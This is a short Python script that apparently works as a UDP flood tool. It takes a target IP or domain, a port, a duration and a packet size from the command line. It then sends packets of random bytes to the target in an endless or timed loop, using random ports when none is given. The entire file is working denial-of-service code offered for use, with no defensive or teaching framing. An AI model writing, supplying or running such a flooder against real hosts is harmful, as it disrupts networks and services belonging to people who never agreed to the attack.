from time import time as tt
import argparse
import socket
import random
import os

def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
        
    fmr = ''
    fmt = ''.format(
        ip=ip,
        port='PORT {port}'.format(port=port) if port else 'RANDOM PORTS',
        time='{time} SECONDS'.format(time=time) if str(time).isdigit() else 'UNLIMITED TIME',
        size=size
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print(' ATTACK FINISHED')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python udpfloodpython.py <ip> <port> <time> <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-s', '--size', type=int, default=1024, help='Size in bytes.')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print('Attack stopped.')